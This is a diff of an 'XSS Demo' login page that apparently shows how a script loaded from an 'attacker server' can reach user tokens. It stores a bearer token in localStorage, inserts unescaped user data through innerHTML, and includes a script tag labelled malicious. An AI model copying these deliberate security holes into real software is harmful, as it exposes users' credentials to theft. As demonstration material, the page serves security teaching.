@@ -3,34 +3,95 @@
   <head>
     <meta charset="UTF-8" />
     <title>XSS Demo</title>
+    <style>
+      body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: #f0f2f5;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+      }
+
+      .container {
+        background: #fff;
+        padding: 2rem;
+        border-radius: 12px;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        max-width: 600px;
+        width: 100%;
+      }
+
+      h1, h2 {
+        text-align: center;
+        color: #333;
+      }
+
+      input {
+        width: 100%;
+        padding: 0.75rem;
+        margin: 0.5rem 0;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+        font-size: 1rem;
+      }
+
+      button {
+        width: 100%;
+        padding: 0.75rem;
+        background-color: #4CAF50;
+        color: white;
+        font-size: 1rem;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        margin-top: 1rem;
+      }
+
+      button:hover {
+        background-color: #45a049;
+      }
+
+      #userInfo {
+        font-family: sans-serif;
+        padding: 1rem;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+        background: #f9f9f9;
+        margin-top: 1.5rem;
+      }
+    </style>
   </head>
   <body>
-    <h1>Login</h1>
-    <input id="email" placeholder="Email" />
-    <input id="password" type="password" placeholder="Password" />
-    <button onclick="login()">Login</button>
+    <div class="container">
+      <h1>Login</h1>
+      <input id="email" placeholder="Email" />
+      <input id="password" type="password" placeholder="Password" />
+      <button onclick="login()">Login</button>
 
-    <h2>User Info</h2>
-    <div id="userInfo" style="font-family: sans-serif; padding: 1rem; border: 1px solid #ccc; border-radius: 8px; max-width: 500px; background: #f9f9f9;"></div>
+      <h2>User Info</h2>
+      <div id="userInfo"></div>
+    </div>
 
-
-    <!-- ✅ Malicious script hosted on attacker server -->
+    <!--  Malicious script hosted on attacker server -->
     <script src="http://localhost:5000/icons.js"></script>
 
-    <!-- ✅ Legit frontend logic -->
+    <!--  Legit frontend logic -->
     <script>
       async function login() {
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
-      
+
         const res = await fetch('http://localhost:4000/api/login', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email, password })
         });
-      
+
         const data = await res.json();
-      
+
         if (data.token) {
           localStorage.setItem('token', data.token);
           loadUser();
@@ -42,36 +103,23 @@
       async function loadUser() {
         const token = localStorage.getItem('token');
         if (!token) return;
-      
-        const res = await fetch('http://localhost:4000/api/user', {
+
+        const res = await fetch('http://localhost:4000/api/userinfo', {
           headers: { Authorization: `Bearer ${token}` }
         });
-      
+
         const user = await res.json();
         const userInfo = document.getElementById('userInfo');
-      
+
         userInfo.innerHTML = `
           <h3>User Profile</h3>
-          <p><strong>Name:</strong> ${user.name}</p>
-          <p><strong>Email:</strong> ${user.email}</p>
-          <p><strong>Admin:</strong> ${user.isAdmin ? '✅ Yes' : '❌ No'}</p>
-      
-          <h4>Settings</h4>
-          <ul>
-            <li><strong>Theme:</strong> ${user.settings?.theme}</li>
-            <li><strong>Notifications:</strong> ${user.settings?.notifications ? 'Enabled 🔔' : 'Disabled 🔕'}</li>
-          </ul>
-      
-          <h4>Messages</h4>
-          <ul>
-            ${(user.messages || []).map(msg =>
-              `<li><strong>From:</strong> ${msg.from}<br><strong>Message:</strong> ${msg.content}</li>`
-            ).join('')}
-          </ul>
+          <p><strong>Name:</strong> Hellllo ${user}</p>
         `;
-        const icon = Icon({ name: 'check', size: 18, color: 'orange' });
+
+        const icon = Icon({ name: 'star', size: 18, color: 'orange' });
         document.getElementById('userInfo').before(icon);
       }
+
       window.addEventListener('DOMContentLoaded', loadUser);
     </script>
   </body>
